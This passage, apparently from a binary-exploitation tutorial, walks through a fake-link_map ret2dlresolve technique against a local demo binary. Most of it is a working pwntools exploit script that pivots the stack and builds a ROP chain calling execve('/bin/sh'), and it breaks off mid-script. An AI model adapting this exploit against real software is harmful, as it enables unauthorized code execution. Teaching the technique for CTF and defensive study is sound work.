<p>Pretty straightfoward, but we wanna ignore this one too, as we simply don&#x27;t care about it, plus we&#x27;d have to fulfil more constraints.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="writing-to-memory">Writing to memory<a href="#writing-to-memory" class="hash-link" aria-label="Direct link to Writing to memory" title="Direct link to Writing to memory">​</a></h3>
<p>For the demo binary, we&#x27;ll select the (only) GOT entry <code>read@GOT</code>, located at <code>0x404000</code>.</p>
<p>We once again have the task of needing to write our structures to memory, but this time is unique, given that we&#x27;ll need to write our fake link map at <code>0x404008</code>. If we stack pivot there, then we&#x27;ll need to also write our rop chain there too, overlapping with the link map. The other problem is <code>_dl_fixup</code> has a large stack size, so with <code>rsp</code> that low, it would crash.</p>
<p>There&#x27;s a few ways around this, but the one I opted for was:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404008</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">read_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>First pivot to the start, so that we write to <code>rsi = 0x404008</code>. What we write here doesn&#x27;t matter; all we care about is setting <code>rsi</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;B&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404f00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">leave_ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xf00</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Now that we&#x27;ve pivoted away from the start, we can call <code>read()</code> with the existing registers, which should be exactly the same as the previous <code>read()</code>, and thus writing again to where we want the link map to be (<code>0x404008</code>). Then we would send the final payload, writing the link map and structures into memory, but also overwriting the return address of <code>read()</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">link_map</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xf10</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Unfortunately since the <code>read()</code> size is bigger, this time we use <code>time.sleep()</code> to separate the <code>p.send()</code> calls, as larger read buffers may cause unintended consequences.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploit-script">Exploit script<a href="#exploit-script" class="hash-link" aria-label="Direct link to Exploit script" title="Direct link to Exploit script">​</a></h3>
<p>Below is the exploit to implement crafting a ropchain to call <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, but can be easily edited to use any rop chain.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./vuln&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./libc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> checksec</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">construct_link_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> syms</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc_sym</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    symtab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmprel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    got_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">_IO_wide_data_2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># jmprel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        jmprel </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            got_addr</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">libc_sym</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># r_offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># r_info (R_X86_64_JUMP_SLOT, sym=i)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">#0,                 # r_addend</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> length</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># elf64_sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        symtab </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># st_info  (!= STT_GNU_IFUNC=10)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># st_other (!= 0)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">69</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># st_shndx (!= SHN_ABS=0xfff1)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> val      </span><span class="token comment" style="color:#999988;font-style:italic"># st_value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> length</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    length </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x348</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    link_map </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_addr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#0x00: 0,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_info[DT_PLTGOT]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#0x58: 0,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_info[DT_STRTAB]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># (this won&#x27;t be used, but needs to be readable)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x68</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_info[DT_SYMTAB]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x70</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">length</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_info[DT_JMPREL]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xf8</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_ld_readonly=0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x31c</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># l_reloc_result</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x340</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">link_map</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> length</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">length</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">length</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">+</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">symtab</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> symtab </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> jmprel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Gadget</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__init__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">val </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> val</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dlrop</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc_sym</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gadgets </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">set</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">isinstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syms </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gadget_symidx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># allocate a reloc_arg for each gadget</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> gadget </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> gadgets</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        val </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> gadget</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">val</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> val </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> gadget_symidx</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            gadget_symidx</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">val</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syms</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            syms</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">val</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">libc_sym</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    link_map </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> construct_link_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> syms</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc_sym</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">isinstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x401026</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">gadget_symidx</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">val</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> link_map</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leave_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">35</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> leave_ret</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">read_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" 